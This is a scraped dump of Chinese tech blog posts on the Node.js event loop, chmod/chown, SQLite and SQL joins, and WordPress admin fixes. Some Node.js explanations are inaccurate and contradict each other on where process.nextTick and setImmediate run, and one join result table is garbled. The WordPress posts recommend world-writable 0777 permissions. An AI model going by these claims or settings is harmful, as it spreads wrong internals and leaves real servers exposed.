┌─────────────┴─────────────┐ │ incoming: ││ │ poll │&lt;─────┤ connections, ││ └─────────────┬─────────────┘ │ data, etc. ││ ┌─────────────┴─────────────┐ └───────────────┘│ │ check ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐└──┤ close callbacks │ └───────────────────────────┘ 解释 每一个框框都表示event loop中的一个阶段（phase） 每一个阶段都有一个先进先出（FIFO）的回调函数（callback）队列（Queue） 当event loop进入某一个阶段时，这个阶段中对应的回调函数队列中的回调函数会被依次执行，直到这个回调函数队列为空，或者达到了指定的最大执行次数。此后，event loop会完成这一阶段的执行，并进入下一个阶段 每一个阶段的含义 times：包括 setTimeout() 和 setInterval()定时器调用的回调函数（callback）。这个回调函数会尽可能地在到达定时器指定的时间后被触发（因为可能会因其他回调函数的执行而导致这个定时器没有准时触发） pending callbacks: 执行一些系统操作的回调。比如当一个TCP Socket尝试连接并收到ECONNREFUSED时，对应的处理这个TCP错误的回调函数会在这个阶段被执行 idle, prepare: 包括process.nextTick()调用的回调。idle对应的回调函数保存在一个数组中，每一次event loop到达idle阶段后，数组中的回调函数会被全部执行完，此后这次event loop的idle阶段才结束 poll: 检查线程池中是否有已经完成的I/O事件，如果有，则将该I/O事件对应的回调函数放入poll阶段对应的队列中。更准确地说： 当poll对应的队列不为空时，队列中的回调函数会被依次执行，直到这个回调函数队列为空，或者达到了指定的最大执行次数 当poll对应的队列为空时， 若代码中包含setImmediate()任务，Event Loop将结束poll阶段，并进入check阶段（并在check阶段执行setImmediate()的回调函数）； 若代码中不包含setImmediate()任务，Event Loop会检查当前是否有setTimeout() and setInterval()定时器已经达到阈值执行时间，如果有，Event Loop会回滚到times阶段，并执行这些定时器对应的回调函数 回调函数需要被添加到队列中，如果有，则添加他们到队列中，并立刻执行他们。 check: 包括setImmediate()调用的回调。 close callbacks: 包括一些意外关闭事件的回调。比如一个socket被突然关闭（调用了socket.destroy()） 可以发现，当poll的队列为空时，代码中又包含setImmediate()任务，Event Loop会立即执行setImmediate()的回调函数，这样的机制是尽可能保证setImmediate()可以被尽早执行。 Node异步的内部实现机制I/O的异步API以一个简单的fs.open()例子，来探索从JavaScript代码层的调用（异步调用），到异步I/O如何被执行，最终回调函数如何被调用（执行回调）。 JavaScript代码层的异步调用fs.open()的作用是根据指定路径和参数去打开一个文件，从而得到一个文件描述符，这是后续所有I/O操作的初始操作。JavaScript层面的代码通过调用C++核心模块以实现下层的操作。 具体来说，JavaScript调用Node的核心模块，核心模块调用C++内建模块，内建模块通过libuv库进行系统内核调用，这里libuv作为封装层，有两个平台的实现，实质上是调用了uv_fs_open()方法。 异步I/O的执行在uv_fs_open()的调用过程中，Node底层会创建一个FSReqWrap请求对象。从JavaScript层传入的参数和回调函数都被封装在这个请求对象中。此后，FSReqWrap请求对象诶推入线程池中等待执行。 至此， JavaScript调用立即返回， 由JavaScript层面发起的异步调用的第一阶段就此结束。 JavaScript线程可以继续执行当前任务的后续操作。当前的I/O操作在线程池中等待执行，不管它是否阻塞I/O，都不会影响到JavaScript线程的后续执行，如此就达到了Node异步I/0的目的。 执行回调JavaScript代码层的异步调用、组装好请求对象、送入I/O线程池等待执行，实际上只是完成了JavaScript代码层的调用和异步I/O的执行，这只是异步I/O的第一部分。获得回调通知并执行回调则是第二部分。 在event loop的每次Tick的poll阶段，Node引擎会检查线程池中是否有已经完成的I/O操作，如果有，则将其请求对象放入poll阶段的队列中。之前提到，请求对象中包含该I/O操作对应的JavaScript回调函数。因此，该回调函数就能被执行了。 总结事件循环、观察者、请求对象、I/O线程池这四者共同构成了Node异步I/O模型的基本要素。 Windows下主要通过IOCP来向系统内核发送I/O调用和从内核获取已完成的I/O操作，配以事件循环，以此完成异步I/O的过程。在Linux下通过epoll实现这个过程，FreeBSD下通过kqueue实现，Solaris下通过Event ports实现。不同的是线程池在Windows下由内核（IOCP）直接提供，*nix 系列下由libuv自行实现。 非 I/O 的异步 API尽管在介绍Node的时候，多数情况下都会提到异步I/O，但是Node中其实还存在一些与 I/O无关的异步API，它们分别是setTimeout()、setInterval()、 setImmediate()和process.nextTick()。 setTimeout()与setInterval()setTimeout()和setInterval()与浏览器中的API是一致的，分别用于单次和多次定时执行任 务。它们的实现原理与异步I/O比较类似，只是不需要I/O线程池的参与。调用setTimeout()或者 setInterval()创建的定时器会被插入到定时器观察者内部的一个红黑树中。每次Tick执行时，会从该红黑树中迭代取出定时器对象，检查是否超过定时时间，如果超过，就形成一个事件，它的回调函数将立即执行。 process.nextTick()在未了解 process.nextTick()之前，很多人也许为了立即异步执行一个任务，会这样调用 setTimeout()来达到所需的效果： 123setTimeout(function () &#123; // TODO &#125;, 0); 由于事件循环自身的特点，定时器的精确度不够。而事实上，采用定时器需要动用红黑树， 创建定时器对象和迭代等操 作， 而 setTimeout(fn, 0) 的方式较为浪费性能。 实际上， process.nextTick()方法的操作相对较为轻量， 每次调用process.nextTick()方法，只会将回调函数放入队列中，在下一轮Tick时取出执行。 定时器中采用红黑树的操作时间复杂度为$O(log_2(n))$，nextTick()的时间复杂度为O(1)。相较之下， process.nextTick()更高效。 另外，过多的process.nextTick()声明会导致所有的异步I/O回调被阻塞。原因在于，由于使用process.nextTick()声明的回调函数会被添加到idle队列中，而idle又在poll阶段之前。因此，只有当idle队列中的回调函数被依次执行后（idle队列被清空后），处理异步I/O的异步回调才能被执行。 setImmediate()可以发现，当poll的队列为空时，代码中又包含setImmediate()任务，Event Loop会立即进入check阶段以执行setImmediate()的回调函数。 这样设计是为了尽可能地保证setImmediate()可以被尽早执行。 （当poll的队列不为空时，会先执行poll队列中的回调函数，直到这个回调函数队列为空，或者达到了指定的最大执行次数。此后进入check阶段，并依次执行check队列中的回调函数，然后进入close callbacks阶段） setImmediate()方法与process.nextTick()方法十分类似，都是将回调函数延迟执行。两者之间细微的差别在于两者被触发的优先级不同（process.nextTick()会被更早触发）。 使用setImmediate()方法声明的回调函数会被添加到idle阶段中，而使用process.nextTick()方法声明的回调函数会被添加到check阶段中。 而由于在Event Loop的每个Tick中，idle阶段早于check阶段。因此，同时调用两者时，process.nextTick()对应的回调函数会先被执行。示例： 1234567891011121314process.nextTick(function () &#123; console.log(&apos;nextTick延迟执行&apos;); &#125;); setImmediate(function () &#123; console.log(&apos;setImmediate延迟执行&apos;); &#125;); console.log(&apos;正常执行&apos;);// 其执行结果如下：// 正常执行 // nextTick延迟执行 // setImmediate延迟执行 Node中的libuv除了V8之外，Node在底层还依赖于libuv。 libuv 是 Node 的副产品。最开始 Node 用 libev 监听各种异步事件，后来因为它无法支持 Windows 才不得不自己写了个 libuv，加入了 Windows 支持。 libuv是一个高性能事件驱动库，使用异步和基于事件驱动的编程方式，核心是提供I/O的事件循环和异步回调。从本质上来说，libuv实现了一套自己的线程池（Thread Pool）来处理所有同步操作（从而模拟出异步的效果）。 libuv提供了一个跨平台的抽象，libuv是一个高性能事件驱动库。本质上，会根据当前运行的操作系统来决定最底层到底使用哪个内核事件通知机制。 在Windows 平台中，依赖的内核事件通知机制是IOCP；在Linux中，对应epoll；在FreeBSD中，对应kqueue()；在中Solaris，对应event ports。 在libuv事件编程模型中, 应用程序只是去监视特定的事件, 并在事件发生后对其作出响应。而收集事件或监控其他事件源则是libuv的职责, 编程人员只需要对感兴趣的事件去注册回调函数, 在事件发生后 libuv 将会调用相应的回调函数. 只要程序不退出并且还有待处理的事件, 事件循环会一直运行。 其他异步事件库Libevent、libev、libuv三个网络库，都是c语言实现的异步事件库Asynchronousevent library）。 异步事件库本质上是提供异步事件通知（Asynchronous Event Notification，AEN）的。异步事件通知机制就是根据发生的事件，调用相应的回调函数进行处理。 libevent :名气最大，应用最广泛，历史悠久的跨平台事件库；Nginx就基于libevent libev :较libevent而言，设计更简练，性能更好，但对Windows支持不够好； libuv :开发node的过程中需要一个跨平台的事件库，他们首选了libev，但又要支持Windows，故重新封装了一套，linux下用libev实现，Windows下用IOCP实现； 可见，目前libuv的影响力最大，其次是libevent，libev关注的人较少。 Reference https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/ 《深入浅出Node.js》 https://medium.com/the-node-js-collection/what-you-should-know-to-really-understand-the-node-js-event-loop-and-its-metrics-c4907b19da4c https://flaviocopes.com/node-event-loop/ libuv初步学习 - https://blog.csdn.net/okiwilldoit/article/details/79014979","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"}]},{"title":"【Linux】chmod/chown - Linux 文件/文件夹 权限","date":"2018-11-05T14:24:04.000Z","path":"2018/11/05/【Linux】Linux-文件-文件夹-权限/","text":"文件权限修改常用命令 - chmod先上常用命令。 修改文件权限为可读可写可执行（777）： 1chmod 777 [文件或文件夹路径] 如chmod 777 /var/home/userid/cc，此文件cc的权限就变为可读可写可执行（777）了。 修改文件夹及该文件夹内所有文件和子文件夹（包括子文件夹中的文件和文件夹）权限为可读可写可执行（777）： 1chmod -R 777 [文件或文件夹路径] 如可以看到test文件夹中包含2个文件和一个子文件夹（其中file2文件位于该子文件夹中）： 使用 chmod -R 777 ./test后，这2个文件和这个子文件夹的权限都会变成可读可写可执行（777）。 chmod命令可用于改变文件或目录的访问权限。 该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。 权限设置之字母设定法一个文件对于一个特定的用户，包含三种权限：读取（Read）、写入（Write）、执行（Execute）。这三种权限都分别用特定的字母表示： r(Read，读取)：对文件而言，具有读取文件内容的权限；对文件夹来说，具有浏览目录的权限 w(Write,写入)：对文件而言，具有新增、修改文件内容的权限；对文件夹来说，具有删除该文件夹，且删除、移动文件夹内文件的权限 x(eXecute，执行)：对文件而言，具有执行文件的权限；对文件夹来说，具有访问该文件夹的权限 通过ls -l [文件（夹）名]，可以看到不同用户（组）对该文件的权限，比如： 具体来说，不同用户（组）又细分为文件所有者访问权限、文件所有者所在群组访问权限或其他用户访问权限。在@后的左边三个字母（--x）表示其他人访问权限对该文件的访问权限，接下来的三个字母（rw-）表示文件所有者所在群组访问权限，再接下来的三个字母（rwx）表示文件所有者访问权限。 在上图中，除了当前用户所在组之外的其他用户对file1文件的访问权限为只可执行， 文件所有者所在组中所有用户对file1文件的访问权限为可读可写，当前用户对file1文件的访问权限为可读可写可执行。 再比如，我们希望设置：文件所有者有“读”、“写”、“执行”权限，群组用户有“读”权限，其他用户有“读”权限，则对应的字母表示为rwx r– r–。 语法1chmod [who] [+ | - | =] [mode] [文件名] 操作对象who可是下述字母中的任一个或者它们的组合 u 表示“用户（user）”，即文件或目录的所有者 g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户 o 表示“其他（others）用户” a 表示“所有（all）用户”。它是系统默认值 操作符号可以是 添加某个权限 取消某个权限 = 赋予给定权限并取消其他所有权限（如果有的话） 模式mode （表示特定权限）可用下述字母的任意组合 r 可读 w 可写 x 可执行 文件名：以空格分开的要改变权限的文件列表，支持通配符 示例1chmod a+x file1 设定文件file1的访问权限为： 文件属主（u） 增加执行权限 与文件属主同组用户（g） 增加执行权限 其他用户（o） 增加执行权限 1chmod ug+w，o-x text 设定文件file1的属性为： 文件属主（u） 增加写权限 与文件属主同组用户（g） 增加写权限 其他用户（o） 删除执行权限 权限设置之数字设定法除了用字母之外，你也可以用数字来表示权限分配。 比如，对于文章开头的777：777有3位，最左边的7表示设置文件所有者访问权限，第二位的7表示设置群组访问权限，最右边的7表示其他人访问权限。 同样地，一个文件对于一个特定的用户，包含三种权限：读取（Read）、写入（Write）、执行（Execute）。这三种权限都对应特定的权限值： r(Read，读取，权限值为4)：对文件而言，具有读取文件内容的权限；对文件夹来说，具有浏览目录的权限 w(Write,写入，权限值为2)：对文件而言，具有新增、修改文件内容的权限；对文件夹来说，具有删除该文件夹，且删除、移动文件夹内文件的权限 x(eXecute，执行，权限值为1)：对文件而言，具有执行文件的权限；对文件夹来说，具有访问该文件夹的权限 将三种权限对应的权限值相加得到的和，就是一个用户或用户组对特定文件的权限。比如： 4+2+1=7，因此7表示该用户（组）对该文件具有读取、写入和执行的权限 4+2=6，因此6表示该用户（组）对该文件具有读取和写入的权限 1=1，因此1表示该用户（组）对该文件只具有执行权限 字母与数字的对应关系： 权限 数值 rwx rw- r– 764 rw- r– r– 644 rw- rw- r– 664 语法1chmod ([-R]) [权限对应的数值] [文件（夹）名] 添加-R参数可将一个文件夹下所有的文件和文件夹（包括子文件夹中的文件和文件夹）权限进行递归修改。 示例1chmod 644 file2 即设定文件mm.txt的属性为：-rw-r–r– 文件属主（u）inin 拥有读、写权限 与文件属主同组人用户（g） 拥有读权限 其他人（o） 拥有读权限 1chmod 750 file3 即设定wchtxt这个文件的属性为：-rwxr-x— 文件主本人（u）inin 可读/可写/可执行权 与文件主同组人（g） 可读/可执行权 其他人（o） 没有任何权限 1chmod 764 file1 表示： 文件所有者对file1文件可读可写可执行 文件所有者对应用户所在的组中的用户对file1文件可读可写 其他用户对file1文件可读 更改文件或文件夹的拥有者 - chown更改文件或文件夹的拥有者可以使用chown命令 1chown [-R] [账户名称] [文件或目录] Referencehttps://blog.csdn.net/z4331016/article/details/79541051","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【SQL】SQLite 命令","date":"2018-02-24T01:26:39.000Z","path":"2018/02/24/【SQL】SQLite-命令/","text":"1.打开或创建一个SQLite3数据库打开或创建一个SQLite3数据库，它叫做testDB.db。 当这个文件存在时，则直接打开。否则会创建一个并命名为指定名称的数据库文件。 1sqlite3 testDB.db 2.显示所有数据库1.database 3.显示所有表1.table 4.创建一张表1234sqlite&gt; CREATE TABLE T3( ID INT PRIMARY KEY NOT NULL, NAME TEXT NOT NULL); 5.列出index表列出所有的Index表：1.index 或者 1.indexes 列出指定表对应的Index表：1.indexes T1 Note： 以上操作还可以这样玩，即不进入sqlite3的交互模式： 6.直接执行sql7.导出所有 表结构（Schema） 和数据到.sql文件1sqlite3 testDB.db .dump &gt; testDB.sql 8.在一个数据库文件中执行所有sql我们利用刚才导出的testDB.sql，在一个新的名为testDB2.db数据库中执行一遍，使得testDB.db数据库和testDB2.db数据库具有完全相同的表结构和数据。 12sqlite3 testDB2.dbsqlite&gt;.read testDB.sql","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【SQL】SQL中几个关键字","date":"2018-02-24T01:19:35.000Z","path":"2018/02/24/【SQL】SQL中几个关键字/","text":"Note: 以下均以SQLite为例。 1 SQL Join 操作Join 操作包括以下四种： Inner Join（内连接）：在表中存在至少一个匹配时，INNER JOIN 关键字返回行。 Outer Join （外连接）： Left Join/Left Outer Join （左连接，左外连接）：Left join（左连接）会从左表中返回所有的记录，即使某条记录在右表中没有与之匹配的行。 Right Join/Right Outer Join （右连接，右外连接）：Right outer join（右连接）会返回右表中的所有记录，即使某条记录在左表中没有与之匹配的行。 FULL Join/FULL Outer Join （全连接，全外连接）：只要其中某个表存在匹配，FULL JOIN 关键字就会返回行。 CROSS JOIN/ Cross Product/ Cartesian（笛卡尔积、交叉连接）：CROSS JOIN 返回的结果为被连接的两个表的乘积。 Natural join（自然连接，R⋈S）：自然连接（Natural join）是一种特殊的等值连接，要求两个关系表中进行比较的属性组必须是名称相同的属性组，并且在结果中把重复的属性列去掉（即：对名称相同的属性组只显示一列）。 1.1 Inner Join（内连接）在表中存在至少一个匹配时，INNER JOIN 关键字返回行。 例子T1表 id_t1 c1_t1 1 aaa 2 bbb T2表 id_t2 c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 inner join T2 on id_t1 = id_t2; 注意，这里的inner关键字是可以省略的，即等效于 1select * from T1 join T2 on id_t1 = id_t2; 结果 id_t1 c1_t1 id_t2 c1_t2 2 bbb 2 ccc 2 bbb 2 ddd 内连接（inner join）与等值连接的区别 内连接：两个表（或连接）中某一数据项相等的连接称，一般用on子句设置条件 等值连接：一般用where子句设置条件 经常有人会问到select a.id,b.name from a,b where a.id=b.pid 与select a.id,b.name from a inner join b on a.id=b.pid 有什么区别，哪个效率更高一些。 先给结论：内连接与等值连接其实是等效。 我们来做个试验： 在sqlite中，我们在执行SQL时，可以用explain query plan来显式地查看一条sql执行的具体过程。 事实上，两种具有不同表达方式的SQL表达式在被执行前，先被解析（parse）成抽象语法树（abstruct syntax tree），语法树被翻译（translate）成代数表达式（algebraic expression），进而代数表达式被优化器（optimizer）优化【通过改写（rewrite）成权威代数表达式（canonical algebraic expression）的方式】，最终权威代数表达被执行器（execution engine）执行。 从上面的截图中，可以看出SQL执行器在分别对这两条SQL做join时，都是先全表扫描T2表，再利用T1表中基本主键id1列上的索引做hash join。这说明这两条sql对应的权威代数表达式其实是完全一致的. 因此，我们可以说内连接与等值连接其实是等效，只是两种不同的表达形式罢了。 1.2 外连接（Outer Join）外连接分为三种：左外连接（Left Outer Join）、右外连接（Right Outer Join）和全外连接（Full Outer Join）。 1.2.1 Left Join/Left Outer Join （左连接，左外连接） Left join（左连接）会从左表(shop)中返回所有的记录，即使某条记录在右表(sale_detail)中没有与之匹配的行。 例子T1表： id_t1 c1_t1 1 aaa 2 bbb 5 ggg T2表： id_t2 c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 left join T2 on id_t1 = id_t2; 结果 id_t1 c1_t1 id_t2 c1_t2 1 aaa 2 bbb 2 ccc 2 bbb 2 ddd 5 ggg 分析注意到T2中还有一个id_t2=3，c1_t2=eee的纪录，但是没有在结果中出现，而T1表中的id_t1=5, c1_t1=ggg的在T2中没有相应的纪录，但是却出现在了查询结果集中。 因为现在是left join，所有的工作以left为准。结果id为1、2的行都是既在左表又在右表的纪录，5是只在左表，不在右表的记录。 1.2.2 Right Join/Right Outer Join （右连接，右外连接） Right outer join（右连接）会返回右表中的所有记录，即使某条记录在左表中没有与之匹配的行。 例子T1表： id_t1 c1_t1 1 aaa 2 bbb T2表： id_t2 c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 right join T2 on id_t1 = id_t2; 结果 id_t2 c1_t2 id_t1 c1_t1 2 ccc 2 bbb 2 ddd 2 bbb 3 eee 1.2.3 FULL Join/FULL Outer Join （全连接，全外连接）只要其中某个表存在匹配，FULL JOIN 关键字就会返回行。 例子T1表 id_t1 c1_t1 1 aaa 2 bbb T2表 id_t2 c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 full join T2 on id_t1 = id_t2; 结果 id_t2 c1_t2 id_t1 c1_t1 1 Aaa 2 ccc 2 bbb 2 ddd 2 bbb 3 eee 分析FULL JOIN 关键字会从左表 (T1) 和右表 (T2) 那里返回所有的行。即使 T1 中的某行在表 T2 中没有匹配，或者 T2 中的某行在表 T1 中没有匹配，这些行同样会被包含在查询结果集中。 1.3 CROSS JOIN/ Cross Product/ Cartesian（笛卡尔积、交叉连接）CROSS JOIN 返回的结果为被连接的两个表的乘积。 例子T1表 id_t1 c1_t1 1 aaa 2 bbb T2表 id_t2 c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 cross join T2; 等价于 1select * from T1 join T2; 等价于 1select * from T1, T2; 结果 id_t2 c1_t2 id_t1 c1_t1 1 aaa 2 ccc 1 aaa 2 ddd 1 aaa 3 eee 2 bbb 2 ccc 2 bbb 2 ddd 2 bbb 3 eee 分析可以发现，T1表中只有2行数据，T2表中有3行数据，而查询结果就产生了2*3=6行数据。 事实上，Cross Join的查询代价是非常大的，因此我们应该尽量避免它（如果能用Inner Join或Outer Join来代替时）。 1.4 Natural join（自然连接，R⋈S）自然连接（Natural join）是一种特殊的等值连接，要求两个关系表中进行比较的属性组必须是名称相同的属性组，并且在结果中把重复的属性列去掉（即：对名称相同的属性组只显示一列）。 例子T1表 id c1_t1 1 aaa 2 bbb 5 ggg T2表 id c1_t2 2 ccc 2 ddd 3 eee SQL1select * from T1 natural join T2; 结果 id c1_t2 id_t1 2 bbb ccc 2 bbb ddd 分析自然连接将在两个表中，具有相同名称的属性上具有相同值的行记录进行匹配（表T1和表T2中的id属性相等的行记录），并且去掉重复的属性列（在结果集中id列只显示一次）。那些没被匹配的行不出现在结果中，因此自然连接的结果会有数据丢失，这些丢失的数据就是那些没有匹配的数据。 自然连接是一种特殊的等值连接，其要求多个表有相同的属性字段，然后条件为相同的属性字段值相等，最后再将表中重复的属性字段去掉，即为自然连接。 如A表中a,b,c字段，B表中有c,d字段，则select * from A natural joinB 相当于 select A.a,A.b,A.c,B.d from A.c = B.c 。 2 SQL UNION 操作符2.1 UNIONUNION 操作符用于合并两个或多个 SELECT 语句的结果集。 UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 例子Employees_China表 E_ID E_Name 01 Zhang, Hua 02 Wang, Wei 03 Carter, Thomas 04 Yang, Ming Employees_USA表 E_ID E_Name 01 Adams, John 02 Bush, George 03 Carter, Thomas 04 Gates, Bill SQL列出所有在中国和美国的不同的雇员名： 123SELECT E_Name FROM Employees_ChinaUNIONSELECT E_Name FROM Employees_USA 结果 E_Name Zhang, Hua Wang, Wei Carter, Thomas Yang, Ming Adams, John Bush, George Gates, Bill 分析UNION 无法列出在中国和美国的所有雇员。在上面的例子中，我们有两个名字相同的雇员（名字都叫Carter, Thomas），他们当中只有一个人被列出来了。UNION 只会选取不同的值。 2.2 UNION ALLUNION ALL 命令和 UNION 命令几乎是等效的，不过 UNION ALL 会列出所有的值（包括重复出现的值）。 123SQL Statement 1UNION ALLSQL Statement 2 例子列出在中国和美国的所有的雇员： 123SELECT E_Name FROM Employees_ChinaUNION ALLSELECT E_Name FROM Employees_USA 结果 E_Name Zhang, Hua Wang, Wei Carter, Thomas Yang, Ming Adams, John Bush, George Carter, Thomas Gates, Bill 分析可以发现，Carter, Thomas会出现两次。 3 SQL 聚合操作（Aggregation）SQL中提供的聚合函数可以用来统计、求和、求最值等等。 分类： COUNT：统计行数量 SUM：获取单个列的合计值 AVG：计算某个列的平均值 MAX：计算列的最大值 MIN：计算列的最小值 SQL GROUP BY 子句SQL GROUP BY 语法聚合函数有时也会结合GROUP BY 使用，根据一个或多个列对结果集进行分组。 1234SELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_name 我们拥有下面这个 “Orders” 表： O_Id OrderDate OrderPrice Customer 1 2008/12/29 1000 Bush 2 2008/11/23 1600 Carter 3 2008/10/05 700 Bush 4 2008/09/28 300 Bush 5 2008/08/06 2000 Adams 6 2008/07/21 100 Carter 现在，我们希望查找每个客户的总金额（总订单）。 我们想要使用 GROUP BY 语句对客户进行组合。 我们使用下列 SQL 语句： 12SELECT Customer,SUM(OrderPrice) FROM OrdersGROUP BY Customer 结果集类似这样： Customer SUM(OrderPrice) Bush 2000 Carter 1700 Adams 2000 SQL HAVING 子句在 SQL 中增加 HAVING 子句原因是，WHERE 关键字无法与合计函数一起使用。 SQL HAVING 语法12345SELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_nameHAVING aggregate_function(column_name) operator value SQL HAVING 实例我们拥有下面这个 “Orders” 表： O_Id OrderDate OrderPrice Customer 1 2008/12/29 1000 Bush 2 2008/11/23 1600 Carter 3 2008/10/05 700 Bush 4 2008/09/28 300 Bush 5 2008/08/06 2000 Adams 6 2008/07/21 100 Carter 现在，我们希望查找订单总金额少于 2000 的客户。 我们使用如下 SQL 语句： 123SELECT Customer,SUM(OrderPrice) FROM OrdersGROUP BY CustomerHAVING SUM(OrderPrice)&lt;2000 结果集类似： Customer SUM(OrderPrice) Carter 1700 4 索引（Index）索引（Index）是一种特殊的查找表，作用是给数据库搜索引擎用来加快数据检索。 简单地说，索引是一个指向表中数据的指针。一个数据库中的索引与一本书后边的索引是非常相似的。例如，如果你想在一本讨论某个话题的书中引用所有页面，则首先需要指向索引，索引按字母顺序列出了所有主题，然后指向一个或多个特定的页码。 索引有助于加快 SELECT 查询，但它会减慢使用 UPDATE 和 INSERT 语句时的数据输入。 索引可以创建或删除，但不会影响数据。使用CREATE INDEX语句创建索引，它允许命名索引，指定表及要索引的一列或多列，并指示索引是升序排列还是降序排列。索引也可以是唯一的，与 UNIQUE 约束类似，在列上或列组合上防止重复条目。 CREATE INDEX命令CREATE INDEX基本语法： 1CREATE INDEX index_name ON table_name; 单列索引： 单列索引是一个只基于表的一个列上创建的索引。基本语法： 1CREATE INDEX index_name ON table_name (column_name); 唯一索引： 使用唯一索引不仅是为了性能，同时也为了数据的完整性。唯一索引不允许任何重复的值插入到表中。基本语法： 1CREATE UNIQUE INDEX index_name on table_name (column_name); 组合索引： 组合索引是基于一个表的两个或多个列上创建的索引。基本语法： 1CREATE INDEX index_name on table_name (column1, column2); 是否要创建一个单列索引还是组合索引，要考虑到你在作为查询过滤条件的 WHERE 子句中使用频繁的列。如果值使用到一个列，则选择使用单列索引。如果在作为过滤的 WHERE 子句中有两个或多个列经常使用，则选择使用组合索引。 隐式索引： 隐式索引是在创建对象时，由数据库服务器自动创建的索引。索引自动创建为主键约束和唯一约束。 如： 1234567891011CREATE INDEX money_index ON teamTable (money);// 查看索引：.indices teamTable// 结果：salary_indexsqlite_autoindex_COMPANY_1 //创建表时创建的隐式索引// 列出数据库范围的所有索引：SELECT * FROM sqlite_master WHERE type = 'index';","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【WordPress】WordPress安装插件时提示输入FTP账号信息","date":"2018-02-24T01:15:17.000Z","path":"2018/02/24/【WordPress】WordPress安装插件时提示输入FTP账号信息/","text":"1.需求升级WordPress后，当在WordPress后台安装插件时，提示输入FTP账号信息。 而在升级WordPress之前，在Plugins界面点击任一个插件的Install Now，都是可以自动下载并安装该插件的。 2.原因出现这个问题，其实是因为在升级WordPress后，WordPress中的部分.php文件的拥有者变为了root（而不是Apache用户）。 Note: 这里以Apache作为Web Server为例，如果你用的是Nginx，也是一样的 我们可以用ls -l进行验证（这里，我的Apache Server根目录位于/var/www/html） 3.解决方案如果你使用的是独立的服务器或VPS（意味着你拥有Web Server对应的操作系统的管理权限）。 修改网站所在目录权限（这里以/var/www/html为网站根目录为例）： 1sudo chmod -R 755 /var/www/html 将网站根目录下所有文件的所有者修改为apache 1sudo chown -R apache /var/www/html 以上执行完成后，再用ls -l进行验证并查看文件对应所属用户。 重启 httpd 服务： 1sudo systemctl restart httpd.service 如果你使用的是虚拟主机（这意味着你不拥有对服务器对应的操作系统的管理权限），则可以在wp-config.php中添加以下代码： 123define(&quot;FS_METHOD&quot;, &quot;direct&quot;);define(&quot;FS_CHMOD_DIR&quot;, 0777);define(&quot;FS_CHMOD_FILE&quot;, 0777);","comments":true,"categories":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/categories/WordPress/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/tags/WordPress/"}]},{"title":"【WordPress】WordPress修改管理员用户名名称","date":"2018-02-24T01:11:20.000Z","path":"2018/02/24/【WordPress】WordPress修改管理员用户名名称/","text":"1.需求在WordPress的管理后台中，对管理员的用户名是无法直接修改的。 为了增强安全性，我需要将管理员的用户名修改成随机字符串。 2.解决方案2.1 猜测猜测 WordPress 用户登录验证的逻辑时，应该也会按照常规思路。即： 将用户名名称和（对原始密码经MD5或对应哈希算法加密后的）密码字符串存储在数据库中 进行用户登录验证时，将当前用户输入的账号密码与数据库中存储对账号密码做匹配，如成功，则赋予账户密码正确且登录成功的状态 这意味着，很可能用户名直接就存储在WordPress的数据库中。 2.2 验证探索一波发现，WordPress所有用户的信息都存储在wp-users表中。 因此，我们可以直接用（如MySql库，执行mysql -u &lt;UserName&gt; -p &lt;Password&gt;）或借助phpMyAdmin等基于UI界面的交互管理方式以修改wp-users表。 2.3 方案选择一种你喜欢的SQL执行方法，一条UPDATE即可搞定： 1UPDATE wp_users SET user_login = &apos;新用户名&apos; WHERE user_login = &apos;老用户名&apos;; 如将用户名admin修改为KP78fiIbb422 1UPDATE wp_users SET user_login = &apos;KP78fiIbb422&apos; WHERE user_login = &apos;admin&apos;;","comments":true,"categories":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/categories/WordPress/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/tags/WordPress/"}]},{"title":"【OOP】依赖反转原则（The Dependency Inversion Principle）、控制反转（Inversion of Control）与依赖注入 （Dependency Injection）","date":"2018-02-24T01:01:44.000Z","path":"2018/02/24/【OOP】依赖反转原则、控制反转与依赖注入/","text":"什么是依赖（Dependency）依赖（Dependency）是一种关系，通俗来讲就是一种需要。 程序员需要电脑，因为没有电脑程序员就没有办法编写代码，所以说程序员依赖电脑，电脑被程序员依赖。 在面向对象编程中，代码可以这样编写。 1234567class Coder &#123; Computer mComputer; public Coder () &#123; mComputer = new Computer(); &#125;&#125; 在这个例子中，Coder 类的内部依赖 Computer 类，这就是依赖在编程世界中的体现。 依赖也可以称之为耦合（coupling）。 依赖反转原则 （The Dependency Inversion Principle）在传统的应用架构中，低层次的组件设计用于被高层次的组件使用，这一点提供了逐步的构建一个复杂系统的可能。在这种结构下，高层次的组件直接依赖于低层次的组件去实现一些任务，但这种对于低层次组件的依赖限制了高层次组件被重用的可行性。 在面向对象编程领域中，依赖反转原则（Dependency inversion 